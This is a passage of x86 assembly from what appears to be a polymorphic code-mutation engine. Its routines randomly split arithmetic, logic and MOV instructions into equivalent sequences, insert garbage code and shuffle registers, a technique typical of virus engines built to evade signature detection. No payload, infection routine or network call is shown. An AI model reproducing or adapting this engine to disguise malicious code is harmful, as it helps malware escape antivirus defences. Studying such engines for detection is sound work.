   mov	ch, 0
   cmp	bh, 0		 ; (ADD)
   jz	@@20
   cmp	bh, 5		 ; (SUB)
   jz	@@20
   cmp	bh, 2		 ; (ADC)
   jz	@@20
   cmp	bh, 3		 ; (SBB)
   jz	@@20
   cmp	bh, 7		 ; (CMP)
   jz	@@8
   test	edi, 0FFFF0000h
   jz	@@14		 ; MOV/OR/AND/XOR reg,imm
   cmp	cl, 1
   jz	@@8
   shr	cl, 1		 ; divide operand in half
   call	_getRND_in_DX
   jns	@@10
   call	_Do_Instruction5 ; do first partial operation

@@10:
   shl	cl, 3
   ror	esi, cl		 ; use remaining part of immediate
   shr	cl, 3
   add	di, cx		 ; use remaining part of memory
   call	_Do_Instruction5 ; do second partial operation
   or	dx, dx
   jns	@@12		 ; do first part if it wasnt done

@@11:
   popad
   nop
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@12:
   popad
   nop
   pushad
   shr	cl, 1

@@13:			 ; do first partial operation
   call	_Do_Instruction2
   jmp	short @@11
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@14:
   cmp	cl, 1
   jz	@@17
   cmp	cl, 4
   jz	@@8
   cmp	di, 4
   jnb	@@16
   call	_getRND_in_DX
   jns	@@16
   mov	cl, 1		 ; split MOV in	two MOVs
   and	dx, 4
   xor	di, dx		 ; select low or high
   cmp	di, 4
   jb	@@15		 ; first low byte register
   rol	si, 8

@@15:			 ; operation reg8,imm8
   call	_Do_Instruction2
   rol	si, 8
   xor	di, 4
   call	_Generate_4times_Garbage
   call	_Do_Instruction2 ; operation reg8,imm8
   jmp	short @@11
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@16:
   cmp	Dont_Extend_Immediate, 0
   jnz	@@8
   mov	cl, 4		 ; use DWORD instead!!!
   call	_getRND_in_DX
   rol	esi, 10h
   mov	si, dx
   rol	esi, 10h	 ; insert random immediate in high WORD
   jmp	short @@13
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@17:			 ; DX=DI
   mov	dx, di
   mov	ch, dl
   xor	ch, 4
   call	_IsRegUsed	 ; check opposite byte register
   cmp	al, 0
   jnz	@@8		 ; skip	if its already used
   xor	eax, eax
   mov	al, 0FFh
   cmp	dl, 4
   jb	@@18
   mov	al, 1
   call	_setRegUsed
   mov	ax, 0FF00h
   shl	si, 8

@@18:
   and	esi, eax
   call	_getRND_in_EDX
   not	eax
   and	edx, eax
   or	esi, edx	 ; insert random immediate
   and	di, 3
   mov	cl, 2		 ; use WORD instead!!!
   call	_getRND_in_DX
   cmp	dh, 50h
   jnb	@@19
   mov	cl, 4		 ; use DWORD instead!!!

@@19:
   call	_Do_Instruction2
   mov	cl, 1
   mov	al, 0
   call	_setRegUsed	 ; free	opposite byte register
   jmp	@@11
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@20:
   test	edi, 0FFFF0000h
   jnz	@@8		 ; skip	if not register
   cmp	cl, 4
   jz	@@8		 ; skip	if it is already DWORD
   cmp	cl, 2
   jz	@@16
   cmp	di, 4		 ; only	if low byte of WORD register
   jb	@@17
   jmp	@@8
Do_Instruction3	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_Instruction5	proc near
   dec	Mutation_Level
   jz	@@1
   push	ax
   push	cx
   push	dx
   mov	ax, 0FFFFh
   mov	cl, 5
   sub	cl, Mutation_Level
   shr	cl, 1
   shr	ax, cl
   call	_getRND_in_DX
   cmp	dx, ax		 ; the smaller,	the more chance	to exit
   pop	dx
   pop	cx
   pop	ax
   ja	@@1
   call	Do_Instruction4	 ; (may	be recursive)
   jmp	short @@2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@1:
   call	Do_Instruction2

@@2:
   inc	Mutation_Level
   retn
Do_Instruction5	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_Instruction4	proc near
   call	_Generate_4times_Garbage
   cmp	SaveFlags, 0
   jnz	Do_Instruction3
   push	dx
   push	ax
   call	_getRND_in_DX
   mov	ax, D_CS_I
   cmp	cl, 4
   jnz	@@1
   cmp	bl, 4
   jb	@@1
   neg	ax
   shr	ax, 2
   neg	ax

@@1:
   cmp	dx, ax
   pop	ax
   pop	dx
   jnb	Do_Instruction3
   cmp	bh, 0FFh
   jnz	loc_0_1D8B	 ; jump	if not MOV
   push	dx
   call	_getRND_in_DX
   cmp	dh, 60h
   pop	dx
   jb	loc_0_1FFE

loc_0_1D8B:		 ; (CMP)
   cmp	bh, 7
   jz	Do_Instruction3
   cmp  bh, 8            ;
   jz	Do_Instruction3
   cmp	bh, 2		 ; (ADC)
   jz	Do_Instruction3
   cmp	bh, 3		 ; (SBB)
   jz	Do_Instruction3
   cmp	bl, 4
   jb	loc_0_1F9A	 ; jump	if not immediate
   cmp	bh, 0		 ; (ADD)
   jz	Operation_ADD_SUB
   cmp	bh, 5		 ; (SUB)
   jz	Operation_ADD_SUB
   cmp	bh, 4		 ; (AND)
   jz	Operation_AND
   cmp	bh, 1		 ; (OR)
   jz	Operation_OR
   cmp	bh, 6		 ; (XOR)
   jz	Operation_XOR
   cmp	bh, 0FFh	 ; (MOV)
   jz	Do_MOV1
   jmp	Do_Instruction3
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Operation_ADD_SUB:
   push	edx
   push	esi
   call	_getRND_in_EDX
   xchg	edx, esi
   call	_Do_Instruction5 ; ADD reg/mem,	x
   call	_Generate_4times_Garbage
   xchg	edx, esi
   sub	esi, edx
   call	_Do_Instruction3 ; ADD reg/mem,	(imm-x)
   call	_Generate_4times_Garbage
   pop	esi
   pop	edx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Operation_XOR:
   push	edx
   push	esi
   call	_getRND_in_EDX
   xchg	edx, esi
   call	_Do_Instruction5 ; XOR reg/mem,	x
   call	_Generate_4times_Garbage
   xchg	edx, esi
   xor	esi, edx
   call	_Do_Instruction3 ; XOR reg/mem,	(imm^x)
   call	_Generate_4times_Garbage
   pop	esi
   pop	edx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Operation_OR:
   push	eax
   push	edx
   push	esi
   call	_getRND_in_EDX	 ; a
   mov	eax, edx
   and	edx, esi
   neg	eax
   dec	eax
   and	eax, esi
   mov	esi, edx
   call	_getRND_in_EDX	 ; b
   and	edx, esi
   or	eax, edx
   call	_getRND_in_EDX	 ; c
   and	edx, eax
   or	esi, edx	 ; x = imm AND a
			 ; y = imm AND (NOT(a) OR (a AND b))
			 ; bits_of_y = imm AND (NOT(a) OR (a AND b)) AND c
   call	_Do_Instruction5 ; OR reg/mem, (x OR bits_of_y)
   call	_Generate_4times_Garbage
   mov	esi, eax
   call	_Do_Instruction3 ; OR reg/mem, y
   call	_Generate_4times_Garbage
   pop	esi
   pop	edx
   pop	eax
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Operation_AND:
   push	eax
   push	edx
   push	esi
   call	_getRND_in_EDX	 ; a
   mov	eax, edx
   or	edx, esi
   neg	eax
   dec	eax
   or	eax, esi
   mov	esi, edx
   call	_getRND_in_EDX	 ; b
   or	edx, esi
   and	eax, edx
   call	_getRND_in_EDX	 ; c
   or	edx, eax
   and	esi, edx	 ; x = imm OR a
			 ; y = imm OR (NOT(a) AND (a OR	b))
			 ; bits_of_y = imm OR (NOT(a) AND (a OR	b)) OR c
   call	_Do_Instruction5 ; AND reg/mem,	(x AND bits_of_y)
   call	_Generate_4times_Garbage
   mov	esi, eax
   call	_Do_Instruction3 ; AND reg/mem,	y
   call	_Generate_4times_Garbage
   pop	esi
   pop	edx
   pop	eax
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Do_MOV1:
   push	edx
   push	esi
   call	_getRND_in_DX
   cmp	dh, 33h
   ja	loc_0_1EE1
   call	_getRND_in_EDX
   sub	esi, edx
   call	_Do_Instruction5 ; MOV reg/mem,	(imm-x)
   call	_Generate_4times_Garbage
   mov	esi, edx
   mov	bh, 0
   call	_Do_Instruction3 ; ADD reg/mem,	x
   call	_Generate_4times_Garbage
   mov	bh, 0FFh	 ; restore info	about original instruction
   pop	esi
   pop	edx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1EE1:
   cmp	dh, 66h
   ja	loc_0_1F09
   call	_getRND_in_EDX
   add	esi, edx
   call	_Do_Instruction5 ; MOV reg/mem,	(imm+x)
   call	_Generate_4times_Garbage
   mov	esi, edx
   mov	bh, 5
   call	_Do_Instruction3 ; SUB reg/mem,	x
   call	_Generate_4times_Garbage
   mov	bh, 0FFh
   pop	esi
   pop	edx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1F09:
   cmp	dh, 99h
   ja	loc_0_1F31
   call	_getRND_in_EDX
   xor	esi, edx
   call	_Do_Instruction5 ; XOR reg/mem,	(imm^x)
   call	_Generate_4times_Garbage
   mov	esi, edx
   mov	bh, 6
   call	_Do_Instruction3 ; XOR reg/mem,	x
   call	_Generate_4times_Garbage
   mov	bh, 0FFh	 ; restore info	about original instruction
   pop	esi
   pop	edx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1F31:
   cmp	dh, 0CCh
   ja	loc_0_1F68
   call	_getRND_in_EDX	 ; a
   or	esi, edx	 ; x=(imm OR a)
   call	_Do_Instruction5 ; MOV reg/mem,	x
   call	_Generate_4times_Garbage
   neg	esi
   dec	esi
   call	_getRND_in_EDX	 ; b
   and	esi, edx
   pop	edx		 ; (EDX=imm)
   or	esi, edx	 ; y=(NOT(x) AND b) OR imm
   mov	bh, 4
   call	_Do_Instruction3 ; AND reg/mem,	y
   call	_Generate_4times_Garbage
   mov	bh, 0FFh	 ; restore info	about original instruction
   mov	esi, edx
   pop	edx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1F68:		 ; a
   call	_getRND_in_EDX
   and	esi, edx	 ; x=(imm AND a)
   call	_Do_Instruction5 ; MOV reg/mem,	x
   call	_Generate_4times_Garbage
   neg	esi
   dec	esi
   call	_getRND_in_EDX	 ; b
   or	esi, edx
   pop	edx
   and	esi, edx	 ; y=(NOT(a) OR	b) AND imm
   mov	bh, 1
   call	_Do_Instruction3 ; OR reg/mem, y
   call	_Generate_4times_Garbage
   mov	bh, 0FFh	 ; restore info	about original instruction
   mov	esi, edx
   pop	edx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1F9A:
   cmp	bh, 0FFh
   jz	Do_MOV2		 ; jump	if MOV reg/mem,reg
   jmp	Do_Instruction3
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Do_MOV2:
   push	dx
   push	eax
   mov	eax, esi
   cmp	bl, 2
   jz	loc_0_1FB0
   mov	eax, edi

loc_0_1FB0:		 ; (EAX=target register)
   push	esi
   push	edi
   push	bx
   mov	edi, eax
   mov	bh, 0FFh
   mov	bl, 4
   call	_getRND_in_DX
   cmp	dh, 40h
   jnb	loc_0_1FD3
   mov	esi, 0FFFFFFFFh	 ; MOV reg/mem,-1
   call	_Do_Instruction5
   mov	ah, 4		 ; AND
   jmp	short loc_0_1FE9
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1FD3:		 ; MOV reg/mem,0
   xor	esi, esi
   call	_Do_Instruction5
   mov	ah, 1		 ; OR
   or	dx, dx
   jns	loc_0_1FE9
   mov	ah, 6		 ; XOR
   cmp	dh, 0C0h
   jb	loc_0_1FE9
   mov	ah, 0		 ; ADD

loc_0_1FE9:
   pop	bx
   mov	bh, ah
   pop	edi
   pop	esi
   call	_Do_Instruction5
   call	_Generate_4times_Garbage
   mov	bh, 0FFh	 ; restore info	about original instruction
   pop	eax
   pop	dx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1FFE:
   push	cx
   call	_Choose_Register ; choose auxiliar register
   cmp	ch, 8
   jb	Do_MOV3		 ; jump	if new register	was selected successfully
   pop	cx
   jmp	loc_0_1D8B
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Do_MOV3:
   push	ax
   push	bx
   push	edx
   push	esi
   push	edi
   mov	al, 1
   call	_setRegUsed	 ; set auxiliar	register as used
   mov	dl, ch
   and	edx, 7
   push	edx		 ; EDX = auxiliar register
   cmp	bl, 2
   jz	loc_0_202C
   xchg	edi, edx	 ; BL=0
			 ; ESI = source
			 ; EDI = auxiliar (target operand)
			 ; EDX = target
   jmp	short loc_0_202F
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_202C:		 ; BL=2
   xchg	esi, edx	 ; ESI = auxiliar (target operand)
			 ; EDI = target
			 ; EDX = source

loc_0_202F:		 ; BL =	0 ---> MOV auxiliar,source
   call	_Do_Instruction5 ; BL =	2 ---> MOV auxiliar,target
   pop	esi		 ; ESI = auxiliar register
   xchg	edi, edx	 ; EDI = target/source according to BL=0/2
   call	Do_MOV		 ; BL =	0 ---> MOV target,auxiliar
			 ; BL =	2 ---> MOV source,auxiliar
   mov	al, 0
   call	_setRegUsed	 ; set auxiliar	register as free
   pop	edi
   pop	esi
   pop	edx
   pop	bx
   pop	ax
   pop	cx
   retn
Do_Instruction4	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


get_WPregister_BX_CL proc near
   and	edi, 7Fh
   mov	cl, gs:[edi+edi+7Eh]
   mov	bx, gs:[edi+edi]
   retn
get_WPregister_BX_CL endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


convert_WorkPlace_Reg2 proc near
   and	edi, 7Fh
   push	ax
   push	bx
   push	cx
   call	_get_WPregister_BX_CL
   cmp	bx, dx		 ; already done?
   jz	loc_0_208A
   cmp	bx, 0FF00h
   jb	loc_0_2078
   mov	ch, bl
   mov	al, 0
   call	_setRegUsed	 ; set	register CH free

loc_0_2078:		 ; (target)
   cmp	dh, 0FFh
   jnz  loc_0_2085       ; jump if argument is in memory
   mov	ch, dl
   mov	al, 2
   call	_setRegUsed

loc_0_2085:
   mov	gs:[edi+edi], dx

loc_0_208A:
   pop	cx
   pop	bx
   pop	ax
   retn
convert_WorkPlace_Reg2 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Save_Reg_in_WorkPlace proc near
   push	ax
   push	bx
   push	cx
   and	edi, 7Fh
   mov	gs:[edi+edi+7Eh], cl ; save size in WP
   jmp	short loc_0_2078
Save_Reg_in_WorkPlace endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Delete_Reg_in_WorkPlace	proc near
   push	dx
   xor	dx, dx
   call	_convert_WorkPlace_Reg2	; free used reg
   mov	gs:[edi+edi+7Eh], dx
   pop	dx
   retn
Delete_Reg_in_WorkPlace	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


CH_register_to_EDI_WPindex proc	near
   mov	edi, 0FFFFFFFFh

loc_0_20B2:
   inc	edi
   cmp	word ptr gs:[edi+edi], 0FF00h
   jb	loc_0_20B2
   cmp	gs:[edi+edi], ch
   jnz	loc_0_20B2
   cmp	gs:[edi+edi+7Eh], cl
   jnz	loc_0_20B2
   retn
CH_register_to_EDI_WPindex endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


convert_WorkPlace_Reg proc near
   push	cx
   push	esi
   push	edi		 ; EDI=index in	WP
   mov	cl, gs:[edi+edi+7Eh] ; (size)
   mov	si, gs:[edi+edi] ; (register)
   call	_convert_WorkPlace_Reg2	; (DX specifies	new type)
   call	Touch_ESI	 ; (source)
   mov	di, dx
   call	Touch_EDI	 ; (target)
   call	Do_MOV
   pop	edi
   pop	esi
   pop	cx
   retn
convert_WorkPlace_Reg endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


copy_CH_register_to_memory_or_register proc near
   push	dx
   push	cx
   push	edi
   call	CH_register_to_EDI_WPindex ; find register in WP
   cmp	Force_Register_Instead_of_Memory, 0
   jnz	loc_0_210F

loc_0_2100:		 ; CX=1,2,4  (size of register to copy to memory)
   mov	ch, 0
   call	_Allocate_Code_Space ; DX=offset in memory

loc_0_2106:		 ; move	register to memory
   call	_convert_WorkPlace_Reg
   pop	edi
   pop	cx
   pop	dx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_210F:
   call	_Choose_Register
   cmp	ch, 8
   jnb	loc_0_2100
   mov	dh, 0FFh	 ; specify register
   mov	dl, ch
   jmp	short loc_0_2106
copy_CH_register_to_memory_or_register endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Discard_Used_Register proc near
   push	ax
   push	cx
   call	_IsRegUsed	 ; check if CH register	is free
   cmp	al, 0
   jz	loc_0_2169	 ; free
   mov	ah, al
   call	get_Register_Size
   xchg	ah, al		 ; AH=size
   test	al, 1
   jnz	loc_0_216E	 ; already used, and cannot be discarded ?
   cmp	ah, 1
   ja	loc_0_2144
   cmp	cl, 1
   ja	loc_0_214E	 ; (AH==1)&&(CL>1)

loc_0_213D:
   mov	cl, ah
   call	copy_CH_register_to_memory_or_register
   jmp	short loc_0_2169
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2144:
   cmp	cl, 1
   ja	loc_0_213D	 ; (AH>1)&&(CL>1)
   and	ch, 3		 ; (whole word register)
   jmp	short loc_0_213D
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_214E:
   mov	cl, ah
   call	_IsRegUsed
   cmp	al, 0
   jz	loc_0_215B
   call	copy_CH_register_to_memory_or_register ; (copy this register to	its original memory or to other	register)

loc_0_215B:		 ; (high byte)
   or	ch, 4
   call	_IsRegUsed
   cmp	al, 0
   jz	loc_0_2169
   call	copy_CH_register_to_memory_or_register ; (copy this register to	its original memory or to other	register)

loc_0_2169:
   pop	cx
   pop	ax
   mov	al, 1		 ; ok
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_216E:
   pop	cx
   pop	ax
   mov	al, 0		 ; not free  :-(
   retn
Discard_Used_Register endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Discard_Used_Register2 proc near
   push	ax
   call	Discard_Used_Register
   pop	ax
   retn
Discard_Used_Register2 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Discard_Used_Register3 proc near
   mov	Force_Register_Instead_of_Memory, 1 ; move preferably to a register
   call	_Discard_Used_Register2
   mov	Force_Register_Instead_of_Memory, 0 ; now use memory, so we will be sure register will get free
   push	ax
   call	_IsRegUsed
   cmp	al, 0
   pop	ax
   jnz	Discard_Used_Register2 ; if register is	not yet	free, do it again (now we will be using	memory as target)
   retn
Discard_Used_Register3 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Is_Indexed_Memory proc near
   cmp	edi, 8
   jb	loc_0_21AA	 ; jump	if operand is register
   push	edx
   mov	edx, edi
   ror	edx, 10h
   cmp	dx, 106h
   pop	edx
   jz	locret_0_21AB
   clc			 ; on exit CF =	1 meaning memory access	is indexed

loc_0_21AA:		 ; set CF = 0 if operand is register
   cmc

locret_0_21AB:
   retn
Is_Indexed_Memory endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


getRND_Reg_Not_Index proc near
   call	Is_Indexed_Memory ; check target operand
   jb	loc_0_21BC	 ; jump	if indexed memory
   xchg	edi, esi
   call	Is_Indexed_Memory ; check source operand
   xchg	edi, esi
   jnb	loc_0_21CF	 ; jump	if both	operands are registers

loc_0_21BC:		 ; get random reg (not BX,SI,DI)
   call	loc_0_21CF
   cmp	ch, 3		 ; BX
   jz	loc_0_2200
   cmp	ch, 6		 ; SI
   jz	loc_0_2200
   cmp	ch, 7		 ; DI
   jz	loc_0_2200
   retn			 ; (BX,SI,DI will be used for indexing memory)
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_21CF:
   cmp	cl, 1
   jz	getRND_Reg
   cmp	esi, 8
   jb	loc_0_21E0
   cmp	edi, 8
   jnb	getRND_Reg

loc_0_21E0:
   push	dx
   call	_getRND_in_DX
   cmp	dh, 50h
   pop	dx
   jnb	loc_0_2200

getRND_Reg:
   push	dx
   call	_getRND_in_DX
   mov	ch, dh
   and	ch, 7
   pop	dx

Avoid_SP_Reg:
   cmp	cl, 1
   jz	locret_0_2202
   cmp	ch, 4		 ; SP?
   jnz	locret_0_2202

loc_0_2200:		 ; use AX instead of SP
   mov	ch, 0

locret_0_2202:
   retn
getRND_Reg_Not_Index endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Choose_Register_Smart proc near
   push	ax
   mov	ah, 10h		 ; used	to avoid endless loops

loc_0_2206:		 ; choose register of size CL
   call	getRND_Reg
   call	_IsRegUsed
   cmp	al, 0
   jnz	loc_0_2218	 ; reg is in use
   call	IsRegFree
   cmp	al, 0
   jnz	loc_0_228E	 ; ok

loc_0_2218:
   dec	ah
   jnz	loc_0_2206	 ; try another one
   mov	ah, 0

loc_0_221E:
   mov	ch, ah
   call	Avoid_SP_Reg	 ; dont	use SP register
   call	_IsRegUsed
   cmp	al, 0
   jnz	loc_0_2232
   call	IsRegFree
   cmp	al, 0
   jnz	loc_0_228E	 ; ok

loc_0_2232:
   inc	ah
   cmp	ah, 8		 ; try all registers
   jnz	loc_0_221E
   cmp	Force_Memory_Instead_of_Register, 1
   jz	loc_0_228C
   mov	ah, 10h		 ; used	to avoid endless loops

loc_0_2242:
   call	getRND_Reg
   call	_IsRegUsed
   cmp	al, 0
   jz	loc_0_228E	 ; ok
   dec	ah
   jnz	loc_0_2242
   mov	ah, 0

loc_0_2253:
   mov	ch, ah
   call	Avoid_SP_Reg
   call	_IsRegUsed
   cmp	al, 0
   jz	loc_0_228E	 ; ok
   inc	ah
   cmp	ah, 8		 ; try all registers
   jnz	loc_0_2253
   mov	ah, 10h		 ; used	to avoid endless loops

loc_0_2269:
   call	getRND_Reg
   call	Discard_Used_Register ;	***
   cmp	al, 1
   jz	loc_0_228E	 ; ok
   dec	ah
   jnz	loc_0_2269
   mov	ah, 0

loc_0_2279:
   mov	ch, ah
   call	Avoid_SP_Reg
   call	Discard_Used_Register ;	***
   cmp	al, 1
   jz	loc_0_228E	 ; ok
   inc	ah
   cmp	ah, 8		 ; try all regs
   jnz	loc_0_2279

loc_0_228C:		 ; choose memory
   mov	ch, 0FFh

loc_0_228E:
   pop	ax
   retn
Choose_Register_Smart endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Choose_Register	proc near
   mov	Force_Memory_Instead_of_Register, 1
   call	Choose_Register_Smart
   cmp	ch, 8
   jnb	loc_0_22A0	 ; jump	if memory
   call	setRegFree

loc_0_22A0:
   mov	Force_Memory_Instead_of_Register, 0
   retn
Choose_Register	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ESI_WPindex_to_CH_register proc	near
   push	bx
   push	dx
   call	_get_WPregister_BX_CL
   mov	ch, bl
   cmp	bx, 0FF00h
   jnb	loc_0_22BF	 ; jump	if register
   call	Choose_Register_Smart
   mov	dl, ch
   mov	dh, 0FFh
   call	_convert_WorkPlace_Reg ; update	variable in WP

loc_0_22BF:
   pop	dx
   pop	bx
   retn
ESI_WPindex_to_CH_register endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Check_BX_SI_DI proc near
   push	dx
   push	bx
   call	_get_WPregister_BX_CL
   cmp	bh, 0FFh
   jnz	loc_0_22DE
   mov	ch, bl		 ; in case of register,	only BX,SI,DI can be used as memory index
   cmp	bl, 3		 ; BX
   jz	loc_0_2301
   cmp	bl, 6		 ; SI
   jz	loc_0_2301
   cmp	bl, 7		 ; DI
   jz	loc_0_2301

loc_0_22DE:
   call	_getRND_in_DX
   mov	bx, 0FF03h	 ; convert into	BX
   cmp	dh, 55h
   jb	loc_0_22F5
   mov	bx, 0FF06h	 ; convert into	SI
   cmp	dh, 0AAh
   jb	loc_0_22F5
   mov	bx, 0FF07h	 ; convert into	DI

loc_0_22F5:
   mov	dx, bx
   mov	ch, bl
   call _Discard_Used_Register3 ; be sure that register isnt used
   call	_convert_WorkPlace_Reg ; so we use the register	that DX	indicates

loc_0_2301:
   pop	dx
   pop	bx
   retn
Check_BX_SI_DI endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Touch_EDI2 proc	near
   push	cx
   push	bx
   call	_get_WPregister_BX_CL
   mov	di, bx
   call	Touch_EDI
   pop	bx
   pop	cx
   retn
Touch_EDI2 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ESI_WPindex_to_ESI_register_EDI_WPindex	proc near
   push	cx
   xchg	edi, esi
   call	ESI_WPindex_to_CH_register
   movzx edi, ch	 ; CH=register
   xchg	edi, esi	 ; ESI=register
			 ; EDI=index in	WP
   pop	cx
   retn
ESI_WPindex_to_ESI_register_EDI_WPindex	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


get_Immediate_Value proc near
   push	bx
   xor	eax, eax
   call	_Get_ACGCODE_Byte
   cmp	cl, 1
   jz	loc_0_2351	 ; jump	if OperandSize=1
   mov	bl, al
   call	_Get_ACGCODE_Byte
   mov	bh, al
   call	_get_ACGCODE_Word ; (index in WP or high word in case of CL=4)
   cmp	cl, 4
   jnz	loc_0_2348	 ; jump	if it can be an	offset
   shl	eax, 10h

loc_0_2344:
   mov	ax, bx
   jmp	short loc_0_2351
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2348:
   cmp	ax, 0FFFFh
   jz	loc_0_2344	 ; its not offset, but only an immediate
   xchg	ax, bx		 ; AX=immediate
			 ; BX=index in WP
   add	ax, gs:[bx]	 ; AX=start+relative offset inside variable

loc_0_2351:
   pop	bx
   retn
get_Immediate_Value endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


get_offset_Variable proc near
   push	cx
   push	eax
   call	_Get_ACGCODE_Byte
   cmp	al, 80h
   jnb	loc_0_2365	 ; jump	if exist relative displacement
   mov	di, ax
   call	Touch_EDI2
   jmp	short loc_0_2386
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2365:
   mov	cl, 2
   call	get_Immediate_Value ; get offset to variable
   mov	edi, Operand_Ampersand
   or	eax, edi
   or	edi, edi
   jnz	loc_0_237D
   or	eax, 1060000h	 ; without index reg

loc_0_237D:
   and	Operand_Ampersand, 0
   mov	edi, eax

loc_0_2386:
   pop	eax
   pop	cx
   call	Reset_Used_Regs
   retn
get_offset_Variable endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Select_Segment_from_Table proc near
